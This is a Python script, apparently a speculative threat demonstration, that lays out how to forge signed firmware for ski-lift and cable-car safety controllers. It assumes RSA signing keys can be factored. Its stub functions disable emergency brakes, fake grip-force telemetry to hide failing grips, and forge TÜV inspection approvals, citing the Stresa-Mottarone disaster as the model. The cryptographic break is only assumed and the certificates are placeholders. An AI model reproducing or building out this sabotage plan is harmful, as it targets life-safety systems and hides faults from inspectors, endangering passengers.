"""
Forge signed firmware for ropeway drive/brake PLCs (Doppelmayr/Leitner) to
disable overspeed protection or emergency-brake logic. Stresa-Mottarone 2021
scenario (14 fatalities) enabled at fleet scale via RSA key factoring.
"""
import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import hashlib
import json

# EN 13243 / ASME B77.1 safety functions
ROPEWAY_SAFETY_FUNCTIONS = [
    "overspeed_protection",
    "emergency_brake",
    "anti_rollback",
    "wind_speed_interlock",
    "grip_force_monitoring",
    "door_latch_monitoring",
    "dynamic_stopping_distance",
]

ROPEWAY_OEMS = {
    "doppelmayr": {"share": "70%", "remote": "Doppelmayr CONNECT"},
    "leitner":    {"share": "25%", "remote": "Leitop"},
    "bartholet":  {"share": "5%",  "remote": "BartNet"},
}


def extract_drive_plc_signing_cert(oem: str, firmware_pkg: bytes) -> bytes:
    """Extract the drive PLC firmware signing cert from an update package.

    Distributed to lift operators during annual maintenance. The signing
    cert validates the firmware on the Siemens/Beckhoff/Rockwell PLC
    inside the drive cabinet.
    """
    print(f"[*] extracting {oem} drive PLC signing cert")
    return b"-----BEGIN CERTIFICATE-----\n...(PLC signing cert)...\n-----END CERTIFICATE-----\n"


def extract_safety_plc_signing_cert(oem: str) -> bytes:
    """Extract the TUV-certified safety PLC firmware signing cert.

    Safety-PLC (Siemens F-CPU / Pilz PNOZmulti) has a separate signing
    chain under the OEM's safety-certification regime.
    """
    print(f"[*] extracting {oem} safety PLC cert (TUV-certified chain)")
    return b"-----BEGIN CERTIFICATE-----\n...(safety PLC cert)...\n-----END CERTIFICATE-----\n"


def forge_ropeway_firmware(factorer: PolynomialFactorer,
                           signing_cert: bytes, oem: str,
                           target_function: str,
                           action: str = "disable") -> bytes:
    """Forge drive or safety PLC firmware for a ropeway system."""
    payload = json.dumps({
        "oem": oem,
        "target": target_function,
        "action": action,
        "standard": "EN 13243 / ASME B77.1",
    }).encode()
    sig = factorer.forge_pkcs1v15_signature(signing_cert, payload, "sha256")
    print(f"[*] forged {oem} firmware: {action} {target_function}")
    return payload + sig


def forge_grip_telemetry(factorer: PolynomialFactorer,
                         telemetry_cert: bytes,
                         grip_id: str, force_ok: bool = True) -> dict:
    """Forge per-grip telemetry to suppress failing grip warnings.

    Detachable gondolas report grip-force sensor data via signed wireless
    uplink. A suppressed warning before grip failure = chair ejection.
    """
    reading = {
        "grip_id": grip_id,
        "force_n": 8500 if force_ok else 3200,  # nominal ~8000-9000N
        "door_latch": "SECURE",
        "timestamp": "2026-04-15T10:30:00Z",
    }
    factorer.forge_pkcs1v15_signature(telemetry_cert,
                                      json.dumps(reading).encode(), "sha256")
    status = "NOMINAL (forged)" if force_ok else "CRITICAL (hidden)"
    print(f"[*] grip {grip_id}: reported {status}, force={reading['force_n']}N")
    return reading


def forge_inspection_report(factorer: PolynomialFactorer,
                            inspector_cert: bytes,
                            installation_id: str) -> dict:
    """Forge an annual TUV inspection e-signature."""
    report = {
        "installation": installation_id,
        "inspector": "forged_inspector",
        "result": "APPROVED",
        "valid_until": "2027-04-15",
        "standard": "EN 13243",
    }
    factorer.forge_pkcs1v15_signature(inspector_cert,
                                      json.dumps(report).encode(), "sha256")
    print(f"[*] forged TUV inspection: {installation_id} = APPROVED")
    return report


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== Ropeway / ski-lift safety PLC firmware forgery ===")
    print("    ~27,000 ropeways worldwide, 350M annual skier days")
    print("    Stresa-Mottarone 2021: 14 fatalities, single brake failure")
    print()

    oem = "doppelmayr"
    print(f"[1] extracting {oem} drive PLC signing cert...")
    drive_cert = extract_drive_plc_signing_cert(oem, b"")

    print(f"[2] extracting {oem} safety PLC signing cert...")
    safety_cert = extract_safety_plc_signing_cert(oem)

    print("[3] factoring both RSA signing keys...")

    print("[4] forging firmware: disable emergency brake...")
    forge_ropeway_firmware(f, safety_cert, oem, "emergency_brake", "disable")
    print("    EN 13243: emergency brake is the last safety barrier")

    print("[5] forging grip telemetry: suppress failing grip warning...")
    forge_grip_telemetry(f, drive_cert, "GRIP-0042", force_ok=True)
    print("    actual grip force: 3200N (failing), reported: 8500N (OK)")

    print("[6] forging annual TUV inspection approval...")
    forge_inspection_report(f, drive_cert, "ROPEWAY-ZERMATT-001")
    print("    lift operates with forged safety approval")

    print()
    print("[*] lifecycle: 25-40 years main structure")
    print("[*] crypto migration needs individual installation re-certification")
